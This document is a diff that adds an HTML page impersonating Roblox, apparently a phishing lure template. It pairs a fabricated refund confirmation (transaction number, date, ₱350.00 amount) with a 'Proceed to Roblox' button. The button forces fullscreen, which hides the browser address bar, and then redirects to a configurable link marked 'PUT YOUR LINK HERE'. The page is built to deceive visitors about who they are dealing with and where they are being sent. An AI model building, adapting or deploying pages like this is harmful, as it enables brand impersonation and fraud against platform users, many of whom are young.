@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Roblox</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;height:100%}
+body{background:#e9e9eb;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+header{background:#000;height:150px;display:flex;align-items:center;justify-content:center;padding:0 24px}
+header img{width:100%;max-width:220px;height:auto;display:block}
+.card{background:#fff;color:#444;max-width:520px;margin:-60px auto 0;border-radius:18px;padding:40px 24px 48px;text-align:center;width:calc(100% - 32px);box-shadow:0 2px 10px rgba(0,0,0,.12)}
+.card p{margin:0 0 28px;font-size:20px;line-height:1.3}
+.btn{display:block;padding:20px;border-radius:999px;background:#000;color:#fff;font-size:22px;font-weight:700;text-decoration:none;border:0;width:100%;cursor:pointer}
+.btn:active{opacity:.8}
+.refund{margin-top:32px;text-align:left;border-top:1px solid #eee;padding-top:24px}
+.refund h3{margin:0 0 10px;font-size:17px;color:#111}
+.refund p{margin:0 0 16px;font-size:14px;line-height:1.5;color:#555;text-align:left}
+.refund table{width:100%;border-collapse:collapse;font-size:14px}
+.refund table td{padding:8px 0;color:#555;border-bottom:1px solid #f0f0f0}
+.refund table td:last-child{text-align:right;color:#111;font-weight:600}
+.refund table tr:last-child td{border-bottom:0}
+</style>
+</head>
+<body>
+<header>
+  <img src="logo-white.png" alt="Roblox">
+</header>
+<main class="card">
+  <p>Securely continue to Roblox</p>
+  <button class="btn" id="go">Proceed to Roblox</button>
+  <div class="refund">
+    <h3>Refund confirmation</h3>
+    <p>Purchase 2132002934 for Roblox Product made on 08/26/2026 has been refunded. It typically takes 1-3 business days for the money to appear in your account, but in some cases, it can take up to 30 days.</p>
+    <table>
+      <tr><td>Product</td><td>Roblox Product</td></tr>
+      <tr><td>Transaction number</td><td>2132002934</td></tr>
+      <tr><td>Transaction date</td><td>08/26/2026</td></tr>
+      <tr><td>Amount refunded</td><td>₱350.00</td></tr>
+    </table>
+  </div>
+</main>
+<script>
+// PUT YOUR LINK HERE
+const LINK = "https://www.roblox.com";
+document.getElementById("go").addEventListener("click", function(){
+  var el = document.documentElement;
+  var req = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
+  if (req) { try { req.call(el); } catch(err) {} }
+  window.location.href = LINK;
+});
+</script>
+</body>
+</html>
